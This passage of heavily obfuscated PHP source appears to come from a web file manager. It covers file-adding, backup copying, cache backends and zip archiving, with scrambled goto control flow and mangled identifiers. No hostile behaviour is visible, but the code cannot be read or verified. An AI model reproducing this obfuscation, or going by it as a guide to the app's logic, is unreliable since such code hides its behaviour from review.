$E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[75]] = $D™¶Ü›ò‡->getPathInner($E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[75]]); $this->_copyChildTo($D™¶Ü›ò‡, $E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[75]], $aÀĞÚŒ÷Õ, $b›àå¬‹²Ä, $Eê’ÌãÖ, $FšÂ÷‘Îª); } } goto fšòéÜƒâ; AÆÉò•¢è÷: foreach ($D¢ò‹‘ÓÒ× as &$E¿ô¨ÂÉÊÍ) { goto CŸ×‚ÂŞ‡Û; CŸ×‚ÂŞ‡Û: if (isset($f¹‹¸²ğ[$E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[28]]])) { $E¿ô¨ÂÉÊÍ = $f¹‹¸²ğ[$E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[28]]]; } $E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[386]] = $E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[29]] == $Añ¹¯×õì‹[76]; $E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[388]] = _get($E¿ô¨ÂÉÊÍ, $Añ¹¯×õì‹[165], $Añ¹¯×õì‹[33]); goto bÛµ‘¤¥âÛ; aè¬íÆÙ£ğ: if ($b›àå¬‹²Ä) { $Fñ›îÊ…½ = $this->fileNameExistCache($F¬•í”Æœ, $E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[28]]); if ($Fñ›îÊ…½) { if ($E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[386]] || $b›àå¬‹²Ä == REPEAT_SKIP) { continue; } if ($b›àå¬‹²Ä == REPEAT_REPLACE) { $dµŒÃŒñ¯™ = $this->sourceInfoCache($Fñ›îÊ…½); $eõ‘µ¶ˆµÉ = $this->fileHistory($dµŒÃŒñ¯™, $E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[435]], $E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[77]]); if ($eõ‘µ¶ˆµÉ) { $Eê’ÌãÖ[$Añ¹¯×õì‹[518]][] = $E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[435]]; } continue; } else { if ($b›àå¬‹²Ä == REPEAT_RENAME) { $E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[28]] = $this->fileNameAutoCache($F¬•í”Æœ, $E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[28]], $b›àå¬‹²Ä, !1); } } } } if (!$E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[386]] && $E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[435]]) { $Eê’ÌãÖ[$Añ¹¯×õì‹[518]][] = $E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[435]]; } $CŠçÖË—¨[] = $this->_makeItemData($E¿ô¨ÂÉÊÍ, $f¢ËÈªÂçÚ, $E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[28]]); goto cÉ·Â£ô‘; bÛµ‘¤¥âÛ: $E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[77]] = _get($E¿ô¨ÂÉÊÍ, $Añ¹¯×õì‹[77], 0); $E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[435]] = _get($E¿ô¨ÂÉÊÍ, $Añ¹¯×õì‹[435], 0); if (!isset($E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[557]]) && $E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[435]]) { $Eê’ÌãÖ[$Añ¹¯×õì‹[554]][] = $E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[435]]; } goto aè¬íÆÙ£ğ; cÉ·Â£ô‘: } unset($E¿ô¨ÂÉÊÍ); if (!empty($CŠçÖË—¨)) { $this->addAll($CŠçÖË—¨); } goto f¾æš¡¿Ñ¾; a¿¸Íµ«: $D¢ò‹‘ÓÒ× = array_merge($f¢Ûô…“òæ[$Añ¹¯×õì‹[73]], $f¢Ûô…“òæ[$Añ¹¯×õì‹[74]]); $f¹‹¸²ğ = $this->_addFiles($D™¶Ü›ò‡, $f¢Ûô…“òæ[$Añ¹¯×õì‹[73]], $FšÂ÷‘Îª); $CŠçÖË—¨ = array(); goto AÆÉò•¢è÷; bÎÁîÓ·×¬: $Añ¹¯×õì‹ =& $_SERVER[úÎü]; $f¢ËÈªÂçÚ = $this->sourceInfoCache($F¬•í”Æœ); $f¢Ûô…“òæ = $D™¶Ü›ò‡->listPath($eùÂßÑÔ¤î); goto a¿¸Íµ«; fšòéÜƒâ: } private function _addFiles($F†Ö•àâ·, $bŒ ØÄ‚¶Ø, $d ùŞÆÖ) { goto aİ¾İƒèÎœ; D‡ŒÁö÷çè: $DÛ—èõš£->addAll($B¢í—èÖ¾‘); $EÙ¨¸óÆàŞ = array($e¦ôµÍ÷©[167] => array($e¦ôµÍ÷©[7], array_keys($eá‡‡¾©½›))); $EíËÓô˜  = $DÛ—èõš£->where($EÙ¨¸óÆàŞ)->select(); goto eå‰¹ˆåÌ×; BêÈ›Ûâ‚: foreach ($bŒ ØÄ‚¶Ø as $A˜Ü¤£–Ú÷) { $bÓÊ™¯˜±ô[$A˜Ü¤£–Ú÷[$e¦ôµÍ÷©[28]]] = $A˜Ü¤£–Ú÷; } return $bÓÊ™¯˜±ô; goto B¸Ã°ë¦·; b³Éêõ¾¡»: foreach ($bŒ ØÄ‚¶Ø as &$bšˆ™è­òË) { goto aÇ•²ÔŠ©¶; Bî§ì»ÂÜ: $bšˆ™è­òË[$e¦ôµÍ÷©[167]] = $Fà—Í¤Æó¬; Hook::trigger($e¦ôµÍ÷©[559], $bšˆ™è­òË); $eá‡‡¾©½›[$Fà—Í¤Æó¬][] =& $bšˆ™è­òË; goto cº¥ØàØĞÔ; dÄÛÑ–½ßá: $Fà—Í¤Æó¬ = $F†Ö•àâ·->hashMd5($bšˆ™è­òË[$e¦ôµÍ÷©[75]]); if (strlen($Fà—Í¤Æó¬) > 10 && !isset($eá‡‡¾©½›[$Fà—Í¤Æó¬])) { $eá‡‡¾©½›[$Fà—Í¤Æó¬] = array(); } $bšˆ™è­òË[$e¦ôµÍ÷©[168]] = $aÒåÛ¹Å¸ñ; goto Bî§ì»ÂÜ; aÇ•²ÔŠ©¶: Hook::trigger($e¦ôµÍ÷©[558], $bšˆ™è­òË); $bšˆ™è­òË[$e¦ôµÍ÷©[75]] = $F†Ö•àâ·->getPathInner($bšˆ™è­òË[$e¦ôµÍ÷©[75]]); $aÒåÛ¹Å¸ñ = $F†Ö•àâ·->hashSimple($bšˆ™è­òË[$e¦ôµÍ÷©[75]]); goto dÄÛÑ–½ßá; cº¥ØàØĞÔ: if (count($eá‡‡¾©½›[$Fà—Í¤Æó¬]) > 1) { $bšˆ™è­òË[$e¦ôµÍ÷©[557]] = !0; } goto DĞğÒì°”è; DĞğÒì°”è: } unset($bšˆ™è­òË); $EÙ¨¸óÆàŞ = array($e¦ôµÍ÷©[167] => array($e¦ôµÍ÷©[7], array_keys($eá‡‡¾©½›))); goto cÉ¨‰‹ïÒ·; aİ¾İƒèÎœ: $e¦ôµÍ÷© =& $_SERVER[úÎü]; if (!$bŒ ØÄ‚¶Ø || count($bŒ ØÄ‚¶Ø) == 0) { return array(); } $eá‡‡¾©½› = array(); goto b³Éêõ¾¡»; eå‰¹ˆåÌ×: $EíËÓô˜  = $EíËÓô˜  ? $EíËÓô˜  : array(); foreach ($EíËÓô˜  as $cº°´ ÄÓÇ) { if (!isset($eá‡‡¾©½›[$cº°´ ÄÓÇ[$e¦ôµÍ÷©[167]]])) { continue; } $fÔãØ”òİê =& $eá‡‡¾©½›[$cº°´ ÄÓÇ[$e¦ôµÍ÷©[167]]]; foreach ($fÔãØ”òİê as &$bšˆ™è­òË) { $bšˆ™è­òË[$e¦ôµÍ÷©[435]] = $cº°´ ÄÓÇ[$e¦ôµÍ÷©[435]]; } unset($bšˆ™è­òË); } $bÓÊ™¯˜±ô = array(); goto BêÈ›Ûâ‚; Dù‡—ÅÉƒ: foreach ($EíËÓô˜  as $cº°´ ÄÓÇ) { if (!isset($eá‡‡¾©½›[$cº°´ ÄÓÇ[$e¦ôµÍ÷©[167]]])) { continue; } $cõŒãÌ‰£ = $eá‡‡¾©½›[$cº°´ ÄÓÇ[$e¦ôµÍ÷©[167]]]; foreach ($cõŒãÌ‰£ as &$bšˆ™è­òË) { $bšˆ™è­òË[$e¦ôµÍ÷©[435]] = $cº°´ ÄÓÇ[$e¦ôµÍ÷©[435]]; $bšˆ™è­òË[$e¦ôµÍ÷©[557]] = !0; } unset($bšˆ™è­òË); } $B¢í—èÖ¾‘ = array(); foreach ($bŒ ØÄ‚¶Ø as $C‘§ŠÏàî) { if (isset($C‘§ŠÏàî[$e¦ôµÍ÷©[557]]) && $C‘§ŠÏàî[$e¦ôµÍ÷©[557]]) { continue; } $B°Æò³ˆÉ¢ = $F†Ö•àâ·->getPathInner($C‘§ŠÏàî[$e¦ôµÍ÷©[75]]); $BÛ¹÷¸ÜÌŒ = $DÛ—èõš£->addFileMake($B°Æò³ˆÉ¢, $C‘§ŠÏàî[$e¦ôµÍ÷©[77]], $C‘§ŠÏàî[$e¦ôµÍ÷©[168]], $C‘§ŠÏàî[$e¦ôµÍ÷©[167]], $C‘§ŠÏàî[$e¦ôµÍ÷©[28]], $d ùŞÆÖ); $B¢í—èÖ¾‘[] = $BÛ¹÷¸ÜÌŒ; } goto D‡ŒÁö÷çè; cÉ¨‰‹ïÒ·: $DÛ—èõš£ = Model($e¦ôµÍ÷©[560]); $EíËÓô˜  = $DÛ—èõš£->where($EÙ¨¸óÆàŞ)->select(); $EíËÓô˜  = $EíËÓô˜  ? $EíËÓô˜  : array(); goto Dù‡—ÅÉƒ; B¸Ã°ë¦·: } } define($_SERVER[úÎü][561], $_SERVER[úÎü][562]); goto bˆœ—ó‘; aªµÉèÏß†: class BackupFile { public function __construct() { } public function index() { goto fÌºš÷ºÀ; bÓ²Ê“ìªÕ: $BÊá·²¥‡æ = array($_SERVER[úÎü][751] => 1, $_SERVER[úÎü][464] => time(), $_SERVER[úÎü][709] => 1, $_SERVER[úÎü][748] => $aØëÑäÛã‘, $_SERVER[úÎü][740] => $bà…ĞˆÀÂ, $_SERVER[úÎü][739] => $eò÷ÜøŠë); if ($e»¦¢Áƒ‹) { $BÊá·²¥‡æ[$_SERVER[úÎü][749]] = $d¿âÊÃÖ›; $BÊá·²¥‡æ[$_SERVER[úÎü][750]] = $D¿¨¼ÉÍ; } Backup::set($BÊá·²¥‡æ); goto E¸à¯„í; eµ‰Ü«ôÃÑ: $f×¿±âîØ = !0; $AÂåğóÇÛ = $this->storeIds(); $DªçÏà–œ© = 1; goto d‘Ü Œ‘º­; fÌºš÷ºÀ: $EŠ‡ñÁƒ“ = Backup::get(); $aØëÑäÛã‘ = $EŠ‡ñÁƒ“[$_SERVER[úÎü][287]][$_SERVER[úÎü][171]][$_SERVER[úÎü][435]]; $cœ£Š“íÛï = array($_SERVER[úÎü][436] => array($_SERVER[úÎü][735], $aØëÑäÛã‘), $_SERVER[úÎü][736] => array($_SERVER[úÎü][325], $EŠ‡ñÁƒ“[$_SERVER[úÎü][692]])); goto E³µ¹ì³¦ö; d‘Ü Œ‘º­: $F±Á’´šÁæ = 1000; $eç²¿›º‚ = $e»¦¢Áƒ‹ = 0; $Cå–öö–‚ = array(); goto BéÛÆ´È§½; E¸à¯„í: $this->_fileFilter($Cå–öö–‚); return !0; goto D¥Î´©ìÏÏ; E³µ¹ì³¦ö: $eò÷ÜøŠë = (int) Model($_SERVER[úÎü][719])->where($cœ£Š“íÛï)->count($_SERVER[úÎü][435]); $bà…ĞˆÀÂ = (int) Model($_SERVER[úÎü][719])->where($cœ£Š“íÛï)->sum($_SERVER[úÎü][77]); $E­¶¾ÜÀãÇ = new TaskFileTransfer($_SERVER[úÎü][737], $_SERVER[úÎü][714], $eò÷ÜøŠë, LNG($_SERVER[úÎü][715]) . $_SERVER[úÎü][716] . LNG($_SERVER[úÎü][738])); goto bê ¼½ëÊø; BéÛÆ´È§½: $D¿¨¼ÉÍ = $d¿âÊÃÖ› = 0; do { $b¬ÚÁ¦¯Ò = $_SERVER[úÎü][741]; $EáÑÑ“â˜ = Model($_SERVER[úÎü][719])->where($cœ£Š“íÛï)->field($b¬ÚÁ¦¯Ò)->order($_SERVER[úÎü][742])->selectPage($F±Á’´šÁæ, $DªçÏà–œ©); $f£óƒœ¨—Ä = !empty($EáÑÑ“â˜[$_SERVER[úÎü][361]]) ? $EáÑÑ“â˜[$_SERVER[úÎü][361]] : array(); foreach ($f£óƒœ¨—Ä as $fåËÎ‡ôÔ) { goto eŒƒ´øòó»; bŠù±˜øœ : if ($eç²¿›º‚ >= 1024 * 1024 * 100) { $BÊá·²¥‡æ = array($_SERVER[úÎü][748] => $aØëÑäÛã‘, $_SERVER[úÎü][749] => $d¿âÊÃÖ›, $_SERVER[úÎü][750] => $D¿¨¼ÉÍ); Backup::set($BÊá·²¥‡æ); $eç²¿›º‚ = $e»¦¢Áƒ‹ = 0; } goto Cñ éÆÊÌÜ; eŒƒ´øòó»: if (!$this->_fileExist($fåËÎ‡ôÔ, $Cå–öö–‚, $AÂåğóÇÛ)) { $eò÷ÜøŠë -= 1; $bà…ĞˆÀÂ -= (int) $fåËÎ‡ôÔ[$_SERVER[úÎü][77]]; write_log("\146\151\x6c\x65\x20\156\157\164\40\x65\x78\151\163\x74\x2e\146\151\154\x65\111\104\x3a{$fåËÎ‡ôÔ[$_SERVER[úÎü][435]]}\54\x20\x70\x61\x74\x68\x3a{$fåËÎ‡ôÔ[$_SERVER[úÎü][75]]}", $_SERVER[úÎü][743]); continue; } $BˆÇÀ…Ë = $fåËÎ‡ôÔ[$_SERVER[úÎü][75]]; $c½‘‰Ì†–½ = "\173\151\157\72{$EŠ‡ñÁƒ“[$_SERVER[úÎü][692]]}\175" . substr($BˆÇÀ…Ë, strlen("\x7b\x69\157\72{$fåËÎ‡ôÔ[$_SERVER[úÎü][744]]}\x7d")); goto b—Ïƒß¿ä; b—Ïƒß¿ä: if (IO::exist($c½‘‰Ì†–½)) { $E­¶¾ÜÀãÇ->updateFileEnd($fåËÎ‡ôÔ[$_SERVER[úÎü][28]], $fåËÎ‡ôÔ[$_SERVER[úÎü][77]]); } else { $c½‘‰Ì†–½ = get_path_father($c½‘‰Ì†–½); IO::mkdir($c½‘‰Ì†–½); if (!IO::copy($BˆÇÀ…Ë, $c½‘‰Ì†–½, $_SERVER[úÎü][745])) { write_log($_SERVER[úÎü][746] . $BˆÇÀ…Ë . $_SERVER[úÎü][747] . $c½‘‰Ì†–½ . $_SERVER[úÎü][493], $_SERVER[úÎü][714]); $f×¿±âîØ = !1; break; } } $aØëÑäÛã‘ = $fåËÎ‡ôÔ[$_SERVER[úÎü][435]]; $e»¦¢Áƒ‹ += 1; goto bß‹Óõè¢Õ; bß‹Óõè¢Õ: $eç²¿›º‚ += $fåËÎ‡ôÔ[$_SERVER[úÎü][77]]; $d¿âÊÃÖ› += 1; $D¿¨¼ÉÍ += $fåËÎ‡ôÔ[$_SERVER[úÎü][77]]; goto bŠù±˜øœ ; Cñ éÆÊÌÜ: } $F±ææÆÚÎİ = count($f£óƒœ¨—Ä); $DªçÏà–œ©++; } while ($F±ææÆÚÎİ == $F±Á’´šÁæ); $E­¶¾ÜÀãÇ->end(); goto bÓ²Ê“ìªÕ; bê ¼½ëÊø: $E­¶¾ÜÀãÇ->task[$_SERVER[úÎü][699]] = $bà…ĞˆÀÂ; $BÊá·²¥‡æ = array($_SERVER[úÎü][739] => $eò÷ÜøŠë, $_SERVER[úÎü][740] => $bà…ĞˆÀÂ); Backup::set($BÊá·²¥‡æ); goto eµ‰Ü«ôÃÑ; D¥Î´©ìÏÏ: } private function _fileExist($eå¼§£„âŠ, &$AöÑ±Š¤, $eáó©‡ªÉ°) { goto D¹„’¶ìå; BŒ¡¹ Â: $AöÑ±Š¤ = array_merge($AöÑ±Š¤, array_to_keyvalue($b¿£¾µ‘Ğ, $FÔ×Ó‘Œ[33], $FÔ×Ó‘Œ[435])); return !1; goto B×½•ßÂå‘; cÀ¶Ôê‰ƒ: if (!in_array($eå¼§£„âŠ[$FÔ×Ó‘Œ[744]], $eáó©‡ªÉ°)) { return !1; } if (IO::exist($A‹†¾È„¢•)) { return !0; } $Cæº„†¿…› = get_path_father($A‹†¾È„¢•); goto D‰ŠÌïå¨Š; D‰ŠÌïå¨Š: if (IO::exist($Cæº„†¿…›)) { $AöÑ±Š¤[] = $eå¼§£„âŠ[$FÔ×Ó‘Œ[435]]; return !1; } $B«’ëŞÓë = array($FÔ×Ó‘Œ[744] => $eå¼§£„âŠ[$FÔ×Ó‘Œ[744]], $FÔ×Ó‘Œ[75] => array($FÔ×Ó‘Œ[373], "{$Cæº„†¿…›}\45")); $b¿£¾µ‘Ğ = Model($FÔ×Ó‘Œ[719])->where($B«’ëŞÓë)->field($FÔ×Ó‘Œ[436])->select(); goto BŒ¡¹ Â; D¹„’¶ìå: $FÔ×Ó‘Œ =& $_SERVER[úÎü]; $A‹†¾È„¢• = $eå¼§£„âŠ[$FÔ×Ó‘Œ[75]]; if (in_array($eå¼§£„âŠ[$FÔ×Ó‘Œ[435]], $AöÑ±Š¤)) { return !1; } goto cÀ¶Ôê‰ƒ; B×½•ßÂå‘: } private function _fileFilter($F”äİåŞÂ) { $FŠ‡Ï‰¤£„ =& $_SERVER[úÎü]; if (empty($F”äİåŞÂ)) { return; } $EìÂÏá‘í = array($FŠ‡Ï‰¤£„[435] => array($FŠ‡Ï‰¤£„[7], array_unique($F”äİåŞÂ))); $eÕÎÑÓèˆ¯ = Model($FŠ‡Ï‰¤£„[752])->where($EìÂÏá‘í)->field($FŠ‡Ï‰¤£„[385])->select(); foreach ($eÕÎÑÓèˆ¯ as $b‰ƒ—ì ) { Model($FŠ‡Ï‰¤£„[752])->remove($b‰ƒ—ì [$FŠ‡Ï‰¤£„[385]], !1); } } private function storeIds() { $b¢ö±ãë¤Ì =& $_SERVER[úÎü]; $aÎñ³¨Ùœ± = Model($b¢ö±ãë¤Ì[704])->listData(); $A¸ÛèÂ‘ìÍ = array(); $AŒõõ¬Ğ†„ = $GLOBALS[$b¢ö±ãë¤Ì[6]][$b¢ö±ãë¤Ì[84]][$b¢ö±ãë¤Ì[753]]; foreach ($aÎñ³¨Ùœ± as $cºÙšÃ…ô) { $FÎ Ìî¾ØŞ = strtolower($cºÙšÃ…ô[$b¢ö±ãë¤Ì[90]]); if (!isset($AŒõõ¬Ğ†„[$FÎ Ìî¾ØŞ])) { continue; } $E·Á˜§éÕë = $b¢ö±ãë¤Ì[71] . (isset($AŒõõ¬Ğ†„[$FÎ Ìî¾ØŞ]) ? $AŒõõ¬Ğ†„[$FÎ Ìî¾ØŞ] : ucfirst($FÎ Ìî¾ØŞ)); if (!class_exists($E·Á˜§éÕë)) { continue; } $A¸ÛèÂ‘ìÍ[] = $cºÙšÃ…ô[$b¢ö±ãë¤Ì[383]]; } return $A¸ÛèÂ‘ìÍ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto fß…°ì¬›á; fß…°ì¬›á: $dºÕÁÓóøÇ =& $_SERVER[úÎü]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto Fà˜áß¨ªÓ; Fà˜áß¨ªÓ: $d©Œ¼ò·¶í = $GLOBALS[$dºÕÁÓóøÇ[6]][$dºÕÁÓóøÇ[343]]; $E²›™…Šœ = $d©Œ¼ò·¶í[$d©Œ¼ò·¶í[$dºÕÁÓóøÇ[754]]]; $Bá–ò¶‡® = $d©Œ¼ò·¶í[$dºÕÁÓóøÇ[755]]; goto Bä‹îô¦àÔ; Bä‹îô¦àÔ: switch ($d©Œ¼ò·¶í[$dºÕÁÓóøÇ[754]]) { case $dºÕÁÓóøÇ[17]: self::$handle = Model($dºÕÁÓóøÇ[756]); break; case $dºÕÁÓóøÇ[757]: self::$handle = new CacheRedis($E²›™…Šœ, $Bá–ò¶‡®); break; case $dºÕÁÓóøÇ[758]: self::$handle = new CacheMemcached($E²›™…Šœ, $Bá–ò¶‡®); break; case $dºÕÁÓóøÇ[171]: self::$handle = new CacheFile($E²›™…Šœ, $Bá–ò¶‡®); break; default: break; } return self::$handle; goto döèª‹Øç’; döèª‹Øç’: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($dàÈ§´‚) { if (is_array($dàÈ§´‚) || is_object($dàÈ§´‚)) { $dàÈ§´‚ = json_encode($dàÈ§´‚); } $dàÈ§´‚ = rawurlencode($dàÈ§´‚); return md5(KOD_SITE_ID . $_SERVER[úÎü][70] . $dàÈ§´‚); } public static function get($DÙ¿À‘Ç) { $EÏˆÊ„Šåˆ = self::key($DÙ¿À‘Ç); if (!isset(self::$memoryCache[$EÏˆÊ„Šåˆ])) { $c™™…½Ÿíà = self::init()->get($EÏˆÊ„Šåˆ); self::$memoryCache[$EÏˆÊ„Šåˆ] = unserialize($c™™…½Ÿíà); } return self::$memoryCache[$EÏˆÊ„Šåˆ]; } public static function set($E†éæóƒŞŠ, $F«è›Í³êß, $aåÁë÷ÁÃë = false) { goto bêğÏ½ø‚Ó; FÒ¬Æ£ÊÅ: CacheLock::lock($E†éæóƒŞŠ); $AÕã¿ê× = self::init()->set($eÍĞá¸˜ªÎ, serialize($F«è›Í³êß), $aåÁë÷ÁÃë); self::$memoryCache[$eÍĞá¸˜ªÎ] = $F«è›Í³êß; goto E¹èÁ‚’–Í; E¹èÁ‚’–Í: CacheLock::unlock($E†éæóƒŞŠ); return $AÕã¿ê×; goto B•³Û¾•Ü¬; bêğÏ½ø‚Ó: $eÍĞá¸˜ªÎ = self::key($E†éæóƒŞŠ); if (isset(self::$memoryCache[$eÍĞá¸˜ªÎ]) && self::$memoryCache[$eÍĞá¸˜ªÎ] === $F«è›Í³êß) { return !0; } if ($aåÁë÷ÁÃë === 0) { self::$memoryCache[$eÍĞá¸˜ªÎ] = $F«è›Í³êß; return !0; } goto FÒ¬Æ£ÊÅ; B•³Û¾•Ü¬: } public static function remove($Bì¿›¬Ğ‹¿) { goto Bï‘İ¸½ÚØ; cÎÒ»è¼ï£: CacheLock::lock($Bì¿›¬Ğ‹¿); $dß³è˜Ì»² = self::init()->remove($Bß¼¾ŒÀ§‹); CacheLock::unlock($Bì¿›¬Ğ‹¿); goto D®”‹É…è; D®”‹É…è: return $dß³è˜Ì»²; goto Cñ£¼âÆ¶º; Bï‘İ¸½ÚØ: $Bß¼¾ŒÀ§‹ = self::key($Bì¿›¬Ğ‹¿); unset(self::$memoryCache[$Bß¼¾ŒÀ§‹]); self::clearTimeout(); goto cÎÒ»è¼ï£; Cñ£¼âÆ¶º: } public static function removeMemory($cïÆÙğºƒ) { $Dğ¬®îº‘· = self::key($cïÆÙğºƒ); unset(self::$memoryCache[$Dğ¬®îº‘·]); } public static function clearMemory($Bê¹§ÙÎ‹Œ = false) { if ($Bê¹§ÙÎ‹Œ) { $Bê¹§ÙÎ‹Œ = self::key($Bê¹§ÙÎ‹Œ); unset(self::$memoryCache[$Bê¹§ÙÎ‹Œ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[úÎü][759])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[úÎü][760])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($bó®…º¦àÏ, $f“×†òœ) { $BˆÔò£äñ› =& $_SERVER[úÎü]; $this->cachePath = $bó®…º¦àÏ[$BˆÔò£äñ›[75]]; $this->prefix = $BˆÔò£äñ›[761]; $this->cacheTime = $f“×†òœ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($dİÖ•½ùÔ) { $A‚˜ØôÓŞÔ =& $_SERVER[úÎü]; $dİÖ•½ùÔ = str_replace(array($A‚˜ØôÓŞÔ[762], $A‚˜ØôÓŞÔ[93], $A‚˜ØôÓŞÔ[69]), $A‚˜ØôÓŞÔ[763], $dİÖ•½ùÔ); return $this->cachePath . $A‚˜ØôÓŞÔ[764] . $dİÖ•½ùÔ . $A‚˜ØôÓŞÔ[765]; } public function set($B­ÆÆŞ‡”«, $DŒöèÛš, $c ³ˆ²ù¾ = false) { $Aô“¸æõÃë = $this->getFile($B­ÆÆŞ‡”«); if (file_put_contents($Aô“¸æõÃë, $this->prefix . $DŒöèÛš, LOCK_EX)) { return !0; } @unlink($Aô“¸æõÃë); return !1; } public function get($d±˜‰¢»¹) { $f•óˆ•‹íˆ = $this->getFile($d±˜‰¢»¹); if (file_exists($f•óˆ•‹íˆ) && filemtime($f•óˆ•‹íˆ) < time() - $this->cacheTime) { @unlink($f•óˆ•‹íˆ); return !1; } $eˆëÜ«ÆÒ = @file_get_contents($f•óˆ•‹íˆ); return substr($eˆëÜ«ÆÒ, strlen($this->prefix)); } public function remove($cœèÑáÔ®) { $bš¤¬ÄçÅÈ = $this->getFile($cœèÑáÔ®); return @unlink($bš¤¬ÄçÅÈ); } public function deleteAll() { $dº“ºÜç¥È =& $_SERVER[úÎü]; $dÄÉ¢øš’¥ = scandir($this->cachePath); foreach ($dÄÉ¢øš’¥ as $BË‹£—ÏË½) { $FâèÅÌ•ƒ = $this->cachePath . $BË‹£—ÏË½; if (strpos($FâèÅÌ•ƒ, $dº“ºÜç¥È[765]) && strpos($FâèÅÌ•ƒ, $dº“ºÜç¥È[766])) { @unlink($FâèÅÌ•ƒ); } } } public function clearTimeout() { $b¢ë£•Ê¨ =& $_SERVER[úÎü]; $Dİ£²ÛÊİ® = scandir($this->cachePath); foreach ($Dİ£²ÛÊİ® as $BñÅå½é¿») { $A©«à×‡÷ = $this->cachePath . $BñÅå½é¿»; if (strpos($A©«à×‡÷, $b¢ë£•Ê¨[765]) && strpos($A©«à×‡÷, $b¢ë£•Ê¨[766]) && filemtime($A©«à×‡÷) < time() - $this->cacheTime) { @unlink($A©«à×‡÷); } } } } goto Eœæ›ò˜„Ñ; E¶İÑßÊ¾·: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $bÑŠçó—Ã; if (!$bÑŠçó—Ã) { $aŒØ’¥ë = IO::init($_SERVER[úÎü][8]); } return $aŒØ’¥ë; } private static function iconvSystem($a»Ş¹Ğ™Àî) { return self::local()->iconvSystem($a»Ş¹Ğ™Àî); } private static function iconvApp($BçîâÆ‡À) { return self::local()->iconvApp($BçîâÆ‡À); } public static function zip($fĞêéÑÜ—º, $BÙ°«¤Èğˆ = "\172\x69\160", $FœèïŠ™‰ä = '', $Bäˆôˆİ†Œ = REPEAT_RENAME) { goto dµÔª‘Ûõó; Fæùğ‰çÅÑ: foreach ($Aç’±Äé° as $DÊ‹ãäˆÁ => $CÃ‹÷Ô¡¨æ) { $Aç’±Äé°[$DÊ‹ãäˆÁ] = self::iconvSystem($CÃ‹÷Ô¡¨æ); } KodArchive::create($DóÅ¶Â°ƒè, $Aç’±Äé°); if (!IO::exist($Eò„²™¼Ø)) { if ($F½ğ‘£ÕÑ’) { del_dir($F½ğ‘£ÕÑ’); } show_json(LNG($f¹³ÉÏÌ[1041]), !1); } goto fŸ×œ·Æ¡†; fŸ×œ·Æ¡†: if ($FœèïŠ™‰ä || !$F½ğ‘£ÕÑ’) { if ($F½ğ‘£ÕÑ’ && strstr($F½ğ‘£ÕÑ’, TEMP_FILES)) { $CÊÎ„¦Ğ¸İ = $Aç’±Äé° = array(); recursion_dir($b×ÂÈ…É»ª, $CÊÎ„¦Ğ¸İ, $Aç’±Äé°, 0); foreach ($CÊÎ„¦Ğ¸İ as $Dºß£ğëÄ) { del_dir($Dºß£ğëÄ); } foreach ($Aç’±Äé° as $A¹÷ëñãëˆ) { if ($A¹÷ëñãëˆ == $DóÅ¶Â°ƒè) { continue; } del_file($A¹÷ëñãëˆ); } } return $Eò„²™¼Ø; } $eÑïÅŞÈİ† = self::pathFather($FÍí‘¼àØ [$f¹³ÉÏÌ[75]]); $f‹´ÆÃİ† = self::move($Eò„²™¼Ø, $eÑïÅŞÈİ†, $Bäˆôˆİ†Œ); goto f˜êÉßÅÍõ; b»ªÒÈ‚œ‘: $F½ğ‘£ÕÑ’ = !1; if (!$FœèïŠ™‰ä && $dÜÌĞ³â½->getType() == $f¹³ÉÏÌ[102]) { $Aç’±Äé° = self::zipFileList($fĞêéÑÜ—º); } else { $F½ğ‘£ÕÑ’ = $FœèïŠ™‰ä ? $FœèïŠ™‰ä : TEMP_FILES . $f¹³ÉÏÌ[1039] . time() . rand_string(8) . $f¹³ÉÏÌ[8]; mk_dir($F½ğ‘£ÕÑ’); $Aç’±Äé° = self::zipFileList($fĞêéÑÜ—º, $F½ğ‘£ÕÑ’); } $B¡Ø‰ø›ô = $FÍí‘¼àØ [$f¹³ÉÏÌ[28]]; goto a„ñ¶ğÈÈÊ; dµÔª‘Ûõó: $f¹³ÉÏÌ =& $_SERVER[úÎü]; $dÜÌĞ³â½ = self::init($fĞêéÑÜ—º[0][$f¹³ÉÏÌ[75]]); $FÍí‘¼àØ  = self::info($fĞêéÑÜ—º[0][$f¹³ÉÏÌ[75]]); goto b»ªÒÈ‚œ‘; a„ñ¶ğÈÈÊ: if (count($Aç’±Äé°) > 1) { $D“¿—†‚‘‚ = IO::info(IO::pathFather($FÍí‘¼àØ [$f¹³ÉÏÌ[75]])); $B¡Ø‰ø›ô = $D“¿—†‚‘‚[$f¹³ÉÏÌ[28]]; } $b×ÂÈ…É»ª = $F½ğ‘£ÕÑ’; if (!$b×ÂÈ…É»ª) { $b×ÂÈ…É»ª = 